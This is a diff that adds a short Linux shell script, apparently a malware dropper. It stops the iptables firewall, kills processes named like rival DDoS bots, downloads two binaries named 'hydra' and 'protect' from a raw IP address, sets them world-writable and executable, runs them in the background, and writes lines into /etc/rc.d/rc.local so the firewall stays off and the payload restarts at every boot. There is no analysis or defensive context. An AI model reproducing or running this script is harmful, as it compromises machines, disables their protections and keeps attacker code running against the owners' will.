@@ -1,0 +1,16 @@
+#!/bin/sh
+ 
+pkill Linux-udp25000
+pkill Linux-syn25000
+cd  /etc/
+service iptables stop
+wget http://103.37.45.58:1432//hydra
+wget http://103.37.45.58:1432/protect
+chmod 777 hydra
+chmod 777 protect
+nohup ./hydra
+nohup ./protect&
+echo "cd  /etc/">>/etc/rc.d/rc.local
+echo "nohup ./protect">>/etc/rc.d/rc.local
+echo "service iptables stop">>/etc/rc.d/rc.local
+exit
